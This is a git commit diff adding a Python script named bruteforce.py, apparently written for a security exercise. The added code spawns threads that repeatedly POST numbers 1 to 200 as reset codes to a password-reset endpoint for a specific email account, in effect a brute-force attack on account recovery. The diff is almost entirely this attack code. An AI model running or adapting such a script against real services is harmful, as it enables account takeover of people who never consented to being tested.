438e16efc9da35d9487c801dd6cecb3f0d1d6269
Haniee <michelle@Michelles-MacBook-Air-4.local>
2018-05-27 17:49:24 +1000

    Added more stuff

--- Bruteforce/bruteforce.py
+++ Bruteforce/bruteforce.py
@@ -1,6 +1,26 @@
 #!/usr/bin/python3 
 
-import sys 
+import sys, re
+import _thread 
+import time 
+import requests 
+
+def brute_force(num1, num2, delay):
+	count = 0
+	while count < 5: 
+		time.sleep(delay)
+		print("**** starting ****")
+		for number in range(num1, num2):
+			r = requests.post("https://dev.ns.agency/reset", data={'dev-email':'john.military@ns.agency', 'dev-resets':number})
+			print(number)
+		count += 1 
+
+
 
 if __name__ == "__main__":
-	
+	try: 
+		_thread.start_new_thread( brute_force, (1, 100, 2))
+		_thread.start_new_thread( brute_force, (101, 200, 4))
+		
+	except: 
+		print("ERROR: thread failed to start")
